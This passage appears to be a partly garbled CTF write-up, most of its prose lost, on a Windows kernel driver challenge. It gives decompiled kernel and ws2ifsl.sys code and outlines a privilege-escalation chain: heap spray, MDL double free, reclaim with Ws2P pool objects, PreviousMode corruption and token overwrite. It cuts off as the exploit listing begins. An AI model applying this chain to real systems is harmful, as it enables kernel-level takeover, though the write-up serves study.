class="comment">// ioctl</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; p</span><br></pre></td></tr></table></figure><p><code>0x9C402400</code> IoAllocateMdlMDL</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; </span><br><span class="line">sioctl+<span class="number">0x521e</span>:</span><br><span class="line">fffff80a`<span class="number">9852521</span>e ff150cceffff    call    qword ptr [sioctl+<span class="number">0x2030</span> (fffff80a`<span class="number">98522030</span>)]</span><br><span class="line"></span><br><span class="line">*ffff880ab958ed20 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated) *Mdl</span><br></pre></td></tr></table></figure><p>Memset32</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PAGE:<span class="number">000000014000526F</span>                 mov     ecx, r12d       ; Dst</span><br><span class="line">PAGE:<span class="number">0000000140005272</span>                 mov     edx, <span class="number">0F</span>Fh       ; Val</span><br><span class="line">PAGE:<span class="number">0000000140005277</span>                 mov     r8d, r15d       ; Size</span><br></pre></td></tr></table></figure><h3 id="Io-NpFr-Ws2P"><a href="#Io-NpFr-Ws2P" class="headerlink" title="Io&#x2F;NpFr&#x2F;Ws2P"></a>Io&#x2F;NpFr&#x2F;Ws2P</h3><p>WP<a href="https://xz.aliyun.com/t/14190">AliyunCTFwriteup</a>  3264integer truncation32</p><p>VSx86<code>0x9C402400</code> </p><ul><li> <code>MmAllocateContiguousMemory</code> </li></ul><p> DF   UAF</p><p></p><ul><li>IopVerifierExAllocatePoolWithQuotaNonPagedPoolNxPool</li><li>NpFr</li></ul><h4 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h4><p><strong></strong></p><p>IopVerifierExAllocatePoolWithQuotaNtSetInformationFileNtSetEaFilepoolpoolTagIOIO</p><p><a href="https://www.anquanke.com/post/id/255916">etw </a></p><p>ntkrnlImp.exentoskrnl.exe</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID __fastcall <span class="title">IopVerifierExAllocatePoolWithQuota</span><span class="params">(__int64 a1, SIZE_T a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PVOID result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !ViVerifierEnabled</span><br><span class="line">    || (VfRuleClasses &amp; <span class="number">0xFFAFFFFF</span>) == <span class="number">0</span></span><br><span class="line">    &amp;&amp; (VfRuleClasses &amp; <span class="number">0x200000000</span>i64) == <span class="number">0</span></span><br><span class="line">    &amp;&amp; (VfRuleClasses &amp; <span class="number">0x400000000</span>i64) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ExAllocatePoolWithQuotaTag</span>(NonPagedPoolNx, a2, <span class="string">&#x27;  oI&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="built_in">ExAllocatePoolWithTagPriority</span>(</span><br><span class="line">             NonPagedPoolNx,</span><br><span class="line">             a2,</span><br><span class="line">             <span class="number">0x20206F49</span>u,</span><br><span class="line">             (EX_POOL_PRIORITY)((MmVerifierData &amp; <span class="number">0x10</span> | <span class="number">0x40</span>u) &gt;&gt; <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="built_in">RtlRaiseStatus</span>(<span class="number">3221225626</span>i64);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NtSetEaFileDEVICE_OBJECTFlags4DO_BUFFERED_IO<code>PEAuth</code>EVICE_OBJECTFlags0x44</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSYSAPI </span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">NTAPI</span></span><br><span class="line"><span class="function"><span class="title">NtSetEaFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN HANDLE               FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  OUT PIO_STATUS_BLOCK    IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN PVOID                EaBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN ULONG                EaBufferSize </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sets extended-attribute (EA) values for a file.</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">NtSetEaFile</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> __int64 a3, ULONG a4)</span></span></span><br><span class="line"><span class="function"><span class="comment">// ...</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">v4 </span>= (<span class="type">void</span> *)a3;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// v12  a1(FileHandler) Object</span></span><br><span class="line">DeviceObject = <span class="built_in">IoGetRelatedDeviceObject</span>(v12);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">Flags = DeviceObject-&gt;Flags;</span><br><span class="line"><span class="keyword">if</span> ( (Flags &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">ErrorOffset = <span class="number">0</span>;</span><br><span class="line">v26 = a4;</span><br><span class="line"><span class="keyword">if</span> ( a4 )</span><br><span class="line">&#123;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  PoolWithQuota = (<span class="keyword">struct</span> _FILE_FULL_EA_INFORMATION *)<span class="built_in">IopVerifierExAllocatePoolWithQuota</span>(<span class="number">0</span>i64, a4);</span><br><span class="line">  Irp-&gt;AssociatedIrp.MasterIrp = (_IRP *)PoolWithQuota;</span><br><span class="line">  <span class="built_in">memmove</span>(PoolWithQuota, v4, a4);</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h4 id="Ws2P"><a href="#Ws2P" class="headerlink" title="Ws2P"></a>Ws2P</h4><p> <code>ws2ifsl</code></p><ul><li><a href="https://www.anquanke.com/post/id/196893">Windowsws2ifsl.sysUAF</a></li><li><a href="https://bbs.kanxue.com/thread-257435.htm">CVE-2019-1215</a></li></ul><p>NtCreateFile<code>\Device\WS2IFSL\</code>DispatchCreate<code>_FILE_FULL_EA_INFORMATION.EaName</code>NifsPvdCreateProcessFileNifsSctCreateSocketFile</p><p>CreateProcessFile<code>procData</code><code>_FILE_OBJECT.FsContext</code></p><p>ws2ifsl.sys!DispatchCreate</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">DispatchCreate</span><span class="params">(__int64 a1, IRP *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 MasterIrp; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_STACK_LOCATION</span> *CurrentStackLocation; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ProcessFile; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  MasterIrp = (__int64)a2-&gt;AssociatedIrp.MasterIrp;</span><br><span class="line">  <span class="keyword">if</span> ( !MasterIrp )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  CurrentStackLocation = a2-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(MasterIrp + <span class="number">5</span>) != <span class="number">7</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp_0</span>((<span class="type">const</span> <span class="type">char</span> *)(MasterIrp + <span class="number">8</span>), <span class="string">&quot;NifsSct&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp_0</span>((<span class="type">const</span> <span class="type">char</span> *)(MasterIrp + <span class="number">8</span>), <span class="string">&quot;NifsPvd&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      ProcessFile = <span class="built_in">CreateProcessFile</span>((__int64)CurrentStackLocation-&gt;FileObject, a2-&gt;RequestorMode, MasterIrp);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">    v7 = <span class="number">-1073741811</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v5) = a2-&gt;RequestorMode;</span><br><span class="line">  ProcessFile = <span class="built_in">CreateSocketFile</span>(CurrentStackLocation-&gt;FileObject, v5, MasterIrp);</span><br><span class="line">LABEL_7:</span><br><span class="line">  v7 = ProcessFile;</span><br><span class="line">LABEL_9:</span><br><span class="line">  a2-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">  a2-&gt;IoStatus.Status = v7;</span><br><span class="line">  <span class="built_in">IofCompleteRequest</span>(a2, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ws2ifsl!CreateProcessFiletagWs2P ProcData</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CreateProcessFile</span><span class="params">(PFILE_OBJECT pFileObj, KPROCESSOR_MODE Mode, <span class="keyword">struct</span> _IRP *Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  Blink = Irp-&gt;ThreadListEntry.Blink;</span><br><span class="line">  Flink = Irp-&gt;ThreadListEntry.Flink;</span><br><span class="line">  MasterIrp = Irp-&gt;AssociatedIrp.MasterIrp;</span><br><span class="line">  Flags = *(<span class="type">void</span> **)&amp;Irp-&gt;Flags;</span><br><span class="line">LABEL_7:</span><br><span class="line">  Object = <span class="number">0</span>i64;</span><br><span class="line">  v12 = <span class="built_in">ObReferenceObjectByHandle</span>(Flags, <span class="number">0x10</span>u, (POBJECT_TYPE)PsThreadType, Mode, &amp;Object, <span class="number">0</span>i64);</span><br><span class="line">  _object = Object;</span><br><span class="line">  <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="built_in">IoThreadToProcess</span>((PETHREAD)Object);</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="built_in">IoGetCurrentProcess</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      Pool2 = <span class="built_in">ExAllocatePool2</span>(<span class="number">0x61</span>i64, <span class="number">0x110</span>i64, <span class="string">&#x27;P2sW&#x27;</span>);</span><br><span class="line">      _Pool2 = Pool2;</span><br><span class="line">      <span class="keyword">if</span> ( Pool2 )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)Pool2 = <span class="string">&#x27;corP&#x27;</span>;</span><br><span class="line">        *(_QWORD *)(Pool2 + <span class="number">8</span>) = <span class="built_in">PsGetCurrentProcessId</span>();</span><br><span class="line">        *(_DWORD *)(_Pool2 + <span class="number">0x100</span>) = <span class="number">0</span>;</span><br><span class="line">        *(_QWORD *)(_Pool2 + <span class="number">0x108</span>) = <span class="number">1</span>i64;</span><br><span class="line">        <span class="built_in">LOBYTE</span>(_Mode) = Mode;</span><br><span class="line">        v12 = <span class="built_in">InitializeRequestQueue</span>(_Pool2, (<span class="type">int</span>)_object, _Mode, (<span class="type">int</span>)MasterIrp, Blink);</span><br><span class="line">        <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">LOBYTE</span>(__Mode) = Mode;</span><br><span class="line">          v12 = <span class="built_in">InitializeCancelQueue</span>(_Pool2, (<span class="type">int</span>)_object, __Mode, (<span class="type">int</span>)Flink, Blink);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          pFileObj-&gt;FsContext = (PVOID)_Pool2;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>InitializeRequestQueue &amp;&amp; InitializeCancelQueue: Apc&#x2F;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">InitializeRequestQueue</span><span class="params">(PVOID Pool, PVOID a2, <span class="type">char</span> Mode, <span class="keyword">struct</span> _IRP *a4, PVOID ApcContext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... </span></span><br><span class="line">  ApcRoutine = a4;</span><br><span class="line">  *((_BYTE *)Pool + <span class="number">32</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_QWORD *)Pool + <span class="number">3</span>) = (<span class="type">char</span> *)Pool + <span class="number">16</span>;</span><br><span class="line">  *((_QWORD *)Pool + <span class="number">2</span>) = (<span class="type">char</span> *)Pool + <span class="number">16</span>;</span><br><span class="line">  <span class="built_in">KeInitializeSpinLock</span>((PKSPIN_LOCK)Pool + <span class="number">5</span>);</span><br><span class="line">  v8 = <span class="built_in">PsWrapApcWow64Thread</span>(&amp;ApcContext, &amp;ApcRoutine);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = Mode;</span><br><span class="line">    <span class="built_in">KeInitializeApc</span>(</span><br><span class="line">      (<span class="type">char</span> *)Pool + <span class="number">48</span>,</span><br><span class="line">      a2,</span><br><span class="line">      <span class="number">0</span>i64,</span><br><span class="line">      guard_check_icall_nop,</span><br><span class="line">      RequestRundownRoutine,</span><br><span class="line">      ApcRoutine,</span><br><span class="line">      v10,</span><br><span class="line">      ApcContext);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">InitializeCancelQueue</span><span class="params">(PVOID pool, PVOID obj, <span class="type">char</span> mode, <span class="keyword">struct</span> _IRP *a4, PVOID ApcContext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  NTSTATUS v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+30h] [rbp-18h]</span></span><br><span class="line">  PVOID ApcRoutine; <span class="comment">// [rsp+68h] [rbp+20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ApcRoutine = a4;</span><br><span class="line">  *((_BYTE *)pool + <span class="number">152</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_QWORD *)pool + <span class="number">18</span>) = (<span class="type">char</span> *)pool + <span class="number">136</span>;</span><br><span class="line">  *((_QWORD *)pool + <span class="number">17</span>) = (<span class="type">char</span> *)pool + <span class="number">136</span>;</span><br><span class="line">  <span class="built_in">KeInitializeSpinLock</span>((PKSPIN_LOCK)pool + <span class="number">20</span>);</span><br><span class="line">  v8 = <span class="built_in">PsWrapApcWow64Thread</span>(&amp;ApcContext, &amp;ApcRoutine);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = mode;</span><br><span class="line">    <span class="built_in">KeInitializeApc</span>(</span><br><span class="line">      (<span class="type">char</span> *)pool + <span class="number">168</span>,</span><br><span class="line">      obj,</span><br><span class="line">      <span class="number">0</span>i64,</span><br><span class="line">      guard_check_icall_nop,</span><br><span class="line">      CancelRundownRoutine,</span><br><span class="line">      ApcRoutine,</span><br><span class="line">      v10,</span><br><span class="line">      ApcContext);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DispatchClose <code>ExFreePoolWithTag</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  FsContext = (PVOID *)a2-&gt;Tail.Overlay.CurrentStackLocation-&gt;FileObject-&gt;FsContext;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)FsContext == <span class="string">&#x27;corP&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">ObfDereferenceObject</span>(FsContext[<span class="number">7</span>]);</span><br><span class="line">    <span class="built_in">DereferenceProcessContext</span>(FsContext);</span><br><span class="line">LABEL_8:</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p> 0x110PoolHeader0x120</p><p><strong>CloseHandle<code>ObfDereferenceObject</code><code>-1</code><code>ETHREAD.PreviousMode</code>  10</strong></p><p></p><ul><li>heap spray </li><li>allocate ContiguousMemory &amp;&amp; MDL</li><li>free ContiguousMemory &amp;&amp; MDL</li><li> ws2ifsl MDL (Ws2P ProcData)</li><li>double free ContiguousMemory &amp;&amp; MDL</li><li>IoMDLWs2P28<code>ETHREAD.PreviousMode</code></li><li>CloseHandler <code>ETHREAD.PreviousMode</code>0</li><li>NtWriteVirtualMemory token</li></ul><p>x86EPROCESS</p><p></p><ul><li>helper.exe 64NtQuerySystemInfomation</li><li>poc.exe: 32</li><li>exp.exe</li><li></li></ul><p>1</p><p>Nu1L  dynbase</p><ul><li><a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/dynamicbase-use-address-space-layout-randomization?view=msvc-170">&#x2F;DYNAMICBASE | Microsoft Learn</a></li></ul><p>exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span 